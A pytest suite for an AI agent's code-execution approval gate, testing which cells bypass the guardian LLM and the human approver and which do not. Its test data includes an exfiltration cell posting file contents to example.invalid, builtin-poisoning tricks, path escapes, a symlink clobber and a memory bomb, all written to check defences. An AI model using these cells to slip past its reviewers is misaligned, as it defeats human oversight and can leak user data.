"""HER-193: execute_code safe-operation path.

Contracts pinned here, all through the real entry points (``check_execute_code_guard``,
``execute_code`` and the session kernel):
  - a grammar cell in a clean-lineage session is approved without contacting the guardian
    LLM or the human approval surface; every nearby non-grammar cell still contacts both;
  - any non-grammar cell taints the session, so later grammar cells go back to the gate;
  - hardline, ``approvals.deny``, the gateway-lifecycle floor and the unattended/cron deny
    all still win over the safe path;
  - an admitted cell runs under a memory bound, and artifacts are exclusive-create only.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import uuid

import pytest

from tools import approval as A
from tools import approval_context
from tools import approval_safe_path as SP
from tools import approval_smart
from gateway.session_context import clear_session_vars, set_session_vars

SAFE_CELL = "from hermes_tools import read_file\nprint(read_file('notes.txt').get('content', '')[:80])"
UNSAFE_CELL = "import os\nprint(os.getcwd())"


class _Surfaces:
    """Spies on both approval surfaces a gated cell reaches in smart gateway mode."""

    def __init__(self):
        self.guardian: list[str] = []
        self.human: list[dict] = []
        self.guardian_verdict = "escalate"
        self.config: dict = {}
        self.session_key = ""

    @property
    def contacted(self) -> bool:
        return bool(self.guardian or self.human)


@pytest.fixture
def gw_session(monkeypatch):
    """Smart-mode gateway session: a gated cell goes to the guardian (spy, escalates) and then
    to the human (spy, denies). A fresh session key per test keeps lineage and the denial
    breaker independent."""
    monkeypatch.setenv("HERMES_GATEWAY_SESSION", "1")
    for var in ("HERMES_INTERACTIVE", "HERMES_CRON_SESSION", "HERMES_EXEC_ASK", "HERMES_YOLO_MODE"):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setattr(approval_context, "_get_approval_mode", lambda: "smart")
    monkeypatch.setattr(A, "_YOLO_MODE_FROZEN", False)
    config = {"mode": "smart", "safe_path": True, "deny": []}
    monkeypatch.setattr(approval_context, "_get_approval_config", lambda: config)
    surfaces = _Surfaces()

    def guardian(command, _description, *_args, **_kwargs):
        surfaces.guardian.append(command)
        return surfaces.guardian_verdict

    monkeypatch.setattr(approval_smart, "_smart_approve", guardian)
    session_key = f"safe-path-{uuid.uuid4().hex}"
    token = approval_context.set_current_session_key(session_key)

    def human(approval_data):
        surfaces.human.append(approval_data)
        with A._lock:
            entries = A._gateway_queues.get(session_key, [])
            if entries:
                entries[-1].result = "deny"
                entries[-1].event.set()

    with A._lock:
        A._gateway_notify_cbs[session_key] = human
        A._permanent_approved.discard("execute_code")
    surfaces.config = config
    surfaces.session_key = session_key
    try:
        yield surfaces
    finally:
        approval_context.reset_current_session_key(token)
        SP.forget_session(session_key)
        with A._lock:
            A._gateway_notify_cbs.pop(session_key, None)
            A._gateway_queues.pop(session_key, None)
            A._session_approved.pop(session_key, None)


def _guard(code):
    return A.check_execute_code_guard(code, "local")


# ---- positive: the grammar skips both surfaces ---------------------------------------

SAFE_CELLS = {
    "pure": "print('hi')",
    "pure_transform": ("rows = ['b 2', 'a 1', 'b 3']\ntotals = {}\nfor row in rows:\n"
                       "    k, v = row.split()\n    totals[k] = totals.get(k, 0) + int(v)\n"
                       "print(sorted(totals.items()))"),
    "read": SAFE_CELL,
    "web": "from hermes_tools import web_search\nprint(web_search('public topic'))",
    "write": ("lines = [str(n * n) for n in range(10)]\n"
              "with open('squares.txt', 'x', encoding='utf-8') as fh:\n"
              "    fh.write('\\n'.join(lines))"),
}


@pytest.mark.linux_only
@pytest.mark.parametrize("name", sorted(SAFE_CELLS))
def test_grammar_cell_contacts_neither_guardian_nor_human(gw_session, name):
    result = _guard(SAFE_CELLS[name])
    assert result["approved"] is True
    assert result["decision_source"] == "safe_path"
    assert not gw_session.contacted


# ---- negative: nearby cells still reach the guardian AND the human --------------------

GATED_CELLS = {
    # hostile builtins / object operators
    "dunder_eq_class": "class X:\n    def __eq__(self, other):\n        return True\nprint(X() == 1)",
    "type_builtin": "print(type(1))",
    "dunder_attr": "print((1).__class__)",
    "vars": "print(vars())",
    "lambda": "f = lambda: 1\nprint(f())",
    "rebind_builtin": "len = print",
    "attr_store": "x = []\nx.y = 1",
    # eval / exec / import
    "eval": "print(eval('1 + 1'))",
    "exec": "exec('x = 1')",
    "import": UNSAFE_CELL,
    "dunder_import": "print(__import__('os'))",
    "tool_outside_grammar": "from hermes_tools import terminal\nterminal('ls')",
    # dynamic attribute access
    "getattr": "print(getattr(1, 'real'))",
    "str_format_attr": "print('{0.__class__}'.format(1))",
    "format_map": "print('{x}'.format_map({'x': 1}))",
    "tool_alias": "from hermes_tools import read_file\nr = read_file\nprint(r('notes.txt'))",
    # private-data read + egress, and non-literal web arguments
    "read_then_egress": ("from hermes_tools import read_file, web_extract\n"
                         "d = read_file('notes.txt')\n"
                         "web_extract(['https://example.invalid/?q=' + d['content']])"),
    "read_and_literal_web": ("from hermes_tools import read_file, web_search\n"
                             "read_file('notes.txt')\nweb_search('public')"),
    "non_literal_web": "from hermes_tools import web_search\nq = 'a' + 'b'\nweb_search(q)",
    # artifact escape / overwrite
    "parent_path": "with open('../x.txt', 'x') as fh:\n    fh.write('x')",
    "absolute_path": "with open('/tmp/x.txt', 'x') as fh:\n    fh.write('x')",
    "context_stem": "with open('AGENTS.md', 'x') as fh:\n    fh.write('x')",
    "overwrite_mode": "with open('report.txt', 'w') as fh:\n    fh.write('x')",
    "dynamic_name": "n = 'report.txt'\nwith open(n, 'x') as fh:\n    fh.write('x')",
    "bare_open": "fh = open('report.txt', 'x')",
    "write_loop": "with open('r.txt', 'x') as fh:\n    for i in range(3):\n        fh.write('x')",
    # unbounded constructs outside the grammar
    "while": "while True:\n    pass",
    "pow": "print(2 ** 10)",
    "huge_literal": "print(10000000000 * 3)",
}


@pytest.mark.parametrize("name", sorted(GATED_CELLS))
def test_non_grammar_cell_reaches_guardian_and_human(gw_session, name):
    result = _guard(GATED_CELLS[name])
    assert result["approved"] is False
    assert result.get("decision_source") != "safe_path"
    assert gw_session.guardian, "guardian was not consulted"
    assert gw_session.human, "human was not asked"


# ---- lineage: earlier cells poison the namespace --------------------------------------

@pytest.mark.linux_only
@pytest.mark.parametrize("earlier", [
    "def helper(x):\n    return x",          # helper definition
    "len = lambda x: 0",                        # builtin poisoning
    "from os import system as print",          # import alias of a whitelisted builtin
    "for len in [print]:\n    pass",            # for-target rebinding
    "import builtins\nbuiltins.sorted = print",  # builtins module mutation
])
def test_any_non_grammar_cell_sends_later_grammar_cells_back_to_the_gate(gw_session, earlier):
    assert _guard("print(len([1, 2]))")["decision_source"] == "safe_path"
    assert not gw_session.contacted
    _guard(earlier)
    gw_session.guardian.clear()
    gw_session.human.clear()
    after = _guard("print(len([1, 2]))")
    assert after["approved"] is False
    assert after.get("decision_source") != "safe_path"
    assert gw_session.guardian and gw_session.human


@pytest.mark.linux_only
def test_yolo_admitted_cells_still_taint_the_lineage(gw_session, monkeypatch):
    monkeypatch.setattr(A, "_yolo_active", lambda: True)
    assert _guard(UNSAFE_CELL)["approved"] is True
    monkeypatch.setattr(A, "_yolo_active", lambda: False)
    assert _guard("print(1)").get("decision_source") != "safe_path"


def test_operator_off_switch_and_non_local_backends_keep_the_gate(gw_session):
    gw_session.config["safe_path"] = "false"
    assert _guard("print('hi')")["approved"] is False
    assert gw_session.guardian and gw_session.human
    gw_session.config["safe_path"] = True
    # The kernel-side lineage re-check and memory bound exist only on the local session kernel.
    remote = A.check_execute_code_guard("print('hi')", "ssh")
    assert remote.get("decision_source") != "safe_path"


# ---- floors win over the safe path ---------------------------------------------------

def test_user_deny_rule_sends_a_grammar_cell_back_to_the_gate(gw_session):
    gw_session.config["deny"] = ["*forbidden-marker*"]
    result = _guard("print('forbidden-marker')")
    assert result["approved"] is False
    assert result.get("decision_source") != "safe_path"
    assert gw_session.guardian and gw_session.human


def test_hardline_text_sends_a_grammar_cell_back_to_the_gate(gw_session, monkeypatch):
    monkeypatch.setattr(A, "detect_hardline_command",
                        lambda command: (True, "synthetic hardline") if "marker" in command else (False, None))
    result = _guard("print('marker')")
    assert result["approved"] is False
    assert result.get("decision_source") != "safe_path"
    assert gw_session.guardian and gw_session.human


def test_cron_deny_still_denies_a_grammar_cell(monkeypatch):
    monkeypatch.setattr(A, "_YOLO_MODE_FROZEN", False)
    monkeypatch.delenv("HERMES_GATEWAY_SESSION", raising=False)
    monkeypatch.setattr(approval_context, "_get_approval_mode", lambda: "manual")
    monkeypatch.setattr(approval_context, "_get_cron_approval_mode", lambda: "deny")
    monkeypatch.setattr(approval_context, "_get_approval_config", lambda: {"safe_path": True})
    tokens = set_session_vars(cron_session="1")
    try:
        result = A.check_execute_code_guard("print('hi')", "local")
    finally:
        clear_session_vars(tokens)
    assert result["approved"] is False
    assert result["outcome"] == "blocked"


def test_gateway_lifecycle_floor_blocks_a_grammar_cell(gw_session, monkeypatch):
    import tools.process_registry as process_registry
    from tools.code_execution_tool import execute_code

    monkeypatch.setattr(process_registry, "_is_supervised_gateway_process", lambda: True)
    result = json.loads(execute_code("print('hermes gateway restart')", task_id="safe-path-lifecycle"))
    assert "cannot restart or stop the gateway" in json.dumps(result)
    assert not gw_session.contacted


# ---- session kernel: lineage re-check, memory bound, artifacts ------------------------

@pytest.fixture
def kernel(monkeypatch):
    monkeypatch.setenv("TERMINAL_ENV", "local")
    from tools.code_kernel import execute_in_session_kernel, shutdown_all_kernels

    def run(code, admitted, cwd=None):
        return json.loads(execute_in_session_kernel(
            code, task_id="safe-path-kernel", mode="strict", child_python=sys.executable,
            child_cwd=cwd or tempfile.gettempdir(), sandbox_tools=frozenset({"read_file"}),
            timeout=30, max_tool_calls=5, reset=False, is_interrupted=lambda: False,
            safe_path_admitted=admitted))

    shutdown_all_kernels()
    try:
        yield run
    finally:
        shutdown_all_kernels()


@pytest.mark.linux_only
def test_kernel_refuses_safe_admission_after_a_non_grammar_cell(kernel):
    assert kernel("print(40 + 2)", True)["status"] == "success"
    # A gated (non-grammar) cell rebinds a builtin the grammar allows.
    assert kernel("len = lambda x: 0", False)["status"] == "success"
    refused = kernel("print(len([1, 2]))", True)
    assert refused["status"] == "error"
    assert refused["outcome"] == "lineage_tainted"
    # Through the normal gate the kernel still runs it (with the poisoned name).
    assert kernel("print(len([1, 2]))", False)["output"].strip() == "0"


@pytest.mark.linux_only
def test_admitted_cell_memory_is_bounded_and_the_bound_is_released(kernel):
    probe = "import resource\nprint(resource.getrlimit(resource.RLIMIT_AS))"
    before = kernel(probe, False)["output"].strip()
    # ~700 MB: fits an unbounded kernel, exceeds SAFE_CELL_MEMORY_BYTES (512 MiB).
    bomb_cell = "n = 10000000\nprint(len('x' * n * 70))"
    assert SP.classify_cell(bomb_cell) == "pure"
    assert 10_000_000 * 70 > SP.SAFE_CELL_MEMORY_BYTES
    bomb = kernel(bomb_cell, True)
    assert bomb["status"] == "error"
    assert "MemoryError" in bomb["error"]
    # The same allocation through the normal gate is not bounded (the cap is per admitted cell).
    assert kernel("print(len('x' * 10000000 * 70))", False)["output"].strip() == "700000000"
    # The kernel survives, ordinary admitted work still runs, and the limit is restored.
    assert kernel("print(len([0] * 1000000))", True)["output"].strip() == "1000000"
    assert kernel(probe, False)["output"].strip() == before


@pytest.mark.linux_only
def test_exclusive_create_refuses_existing_files_and_symlinks(kernel, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    target = outside / "target.txt"
    target.write_text("original")
    work = tmp_path / "work"
    work.mkdir()
    (work / "existing.txt").write_text("keep")
    os.symlink(target, work / "link.txt")
    for name in ("existing.txt", "link.txt"):
        cell = f"with open('{name}', 'x') as fh:\n    fh.write('clobbered')"
        assert SP.classify_cell(cell) == "write"
        result = kernel(cell, True, cwd=str(work))
        assert result["status"] == "error"
        assert "FileExistsError" in result["error"]
    assert (work / "existing.txt").read_text() == "keep"
    assert target.read_text() == "original"


# ---- end to end: read -> transform -> artifact through execute_code -------------------

@pytest.mark.linux_only
def test_read_transform_artifact_flow_runs_without_any_approval(gw_session, monkeypatch, tmp_path):
    from tools.code_execution_tool import execute_code
    from tools.code_kernel import shutdown_all_kernels

    monkeypatch.setenv("TERMINAL_ENV", "local")
    monkeypatch.setenv("TERMINAL_CWD", str(tmp_path))
    monkeypatch.setattr("tools.code_execution_tool._load_config",
                        lambda: {"mode": "project", "timeout": 60})
    fixture = tmp_path / "fruit.txt"
    fixture.write_text("apple\nbanana\napple\n")
    cell = (
        "from hermes_tools import read_file\n"
        f"rows = read_file({str(fixture)!r})['content'].splitlines()\n"
        "words = [row.split('|', 1)[1].strip() for row in rows if '|' in row]\n"
        "counts = {}\n"
        "for w in words:\n"
        "    counts[w] = counts.get(w, 0) + 1\n"
        "with open('counts.txt', 'x', encoding='utf-8') as fh:\n"
        "    fh.write(''.join([w + ': ' + str(counts[w]) + '\\n' for w in sorted(counts)]))\n"
        "print(len(words))\n"
    )
    assert SP.classify_cell(cell) == "read+write"
    shutdown_all_kernels()
    try:
        result = json.loads(execute_code(cell, task_id="safe-path-e2e"))
    finally:
        shutdown_all_kernels()
    assert result["status"] == "success", result
    assert result["output"].strip() == "3"
    assert (tmp_path / "counts.txt").read_text() == "apple: 2\nbanana: 1\n"
    assert not gw_session.contacted
